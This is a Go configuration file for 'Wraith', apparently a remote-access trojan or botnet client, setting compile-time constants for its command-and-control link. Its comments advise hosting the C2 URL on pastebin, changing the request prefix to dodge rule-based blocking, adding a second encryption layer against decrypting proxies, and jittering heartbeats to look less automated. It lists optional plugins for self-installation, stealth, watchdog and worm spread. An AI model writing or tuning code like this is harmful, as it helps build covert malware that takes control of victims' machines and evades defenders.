package main

/*

This file contains the constants used at compile-time. These will be hard-coded
into the Wraith when it is compiled. Some can be overruled by panel commands when
the Wraith connects.

*/

/* Link to *raw text* file containing the URL of the API. pastebin.com
is a good choice but any raw text hosting will do. If you are sure that the API
URL will never change, you can simply put the API URL directly here
but this is not recommended as changing the API URL will then result in losing
all Wraiths with the previous URL hard-coded. */
const setCCSERVERGETURL string = "http://localhost:8000/API/v4/api.php"

/* This is a prefix added to every encrypted API request sent by the Wraith and
expected at the start of the API response. This is to verify that the Wraith
is indeed communicating with the Wraith API. It is changeable to prevent rule-based
blocking. A short prefix saves bandwidth and is less detectable so is recommended. */
const setAPIREQPREFIX string = "W_"

/* Static encryption key to use during the handshake with the server. It will
be replaced with a panel-generated key after the handshake until the Wraith
is restarted or disconnects. This key does not have to be extremely secure as
the primary encryption method is SSL. This is really only used to make Wraith's
traffic less readable to decrypting proxies and stop not-too-determined would-be
snoopers from seeing our traffic. */
const setSECONDLAYERENCRYPTIONKEY string = "QWERTYUIOPASDFGHJKLZXCVBNM"

/* An ID which the server uses to identify itself. The Wraith will not complete
a handshake with a server which does not provide a trusted fingerprint. This is
used to stop accidental connections to the wrong server should something go wrong
and prevent people from impersonating the server to gain info about the Wraith. */
const setTRUSTEDSERVERFINGERPRINT string = "ABCDEFGHIJKLMNOP"

/* Delay between each heartbeat request (seconds). This should ideally be just
under half of the mark dead time on the panel and no less than 3 seconds to
prevent DDoSing your own server. This value can be altered by the panel during
runtime but will reset whenever the Wraith restarts. Making this value lower
will allow both the Wraith and the panel to have more up-to-date information but
will make Wraith more detectable (more traffic on the wire) and put more load
on your server. 7 seconds is a good compromise for most uses. Do note that Wraith
will add between 0 (inclusive) and 3 (exclusive) seconds to each delay to make
the requests seem less automated and harder to detect. */
const setDEFAULTHEARTBEATDELAYBASE uint64 = 7

/* Delay between handshake reattempts should a handshake fail (seconds). This
should be longer than the heartbeat delay as the server might be unreachable
for a while so the less traffic we send the better. */
const setDEFAULTHANDSHAKEREATTEMPTDELAY uint64 = 20

/* How many handshake fails to ignore before assuming that the connection is dead
and resetting the connection after the Default Handshake Reattempt Delay. This
is how many handshake fails Wraith will accept so in reality Wraith will send
that +1 handshakes before failing. Handshakes which have not exceeded this
number will be re-attempted after a Heartbeat Delay. It's best to set this
number to around [Wraith mark dead delay on API] / [Heartbeat Delay Base] */
const setFAILEDHEARTBEATTOLERANCE uint64 = 2

/* Whether to write information to the console. It is highly recommended to
turn this off unless debugging as leaving it on might increase the executable
filesize and could leak information. */
const setDEBUG bool = true

/* Which plugins from "include/plugins" to include in the Wraith. It is
best to include as few plugins as possible, as any additional plugins will
inrease executable file size, take longer to compile and possibly increase
detectability. */
//import (
	// "./include/plugins/admin-request",
	// "./include/plugins/self-installation",
	// "./include/plugins/stealth",
	// "./include/plugins/watchdog",
	// "./include/plugins/worm",
//)
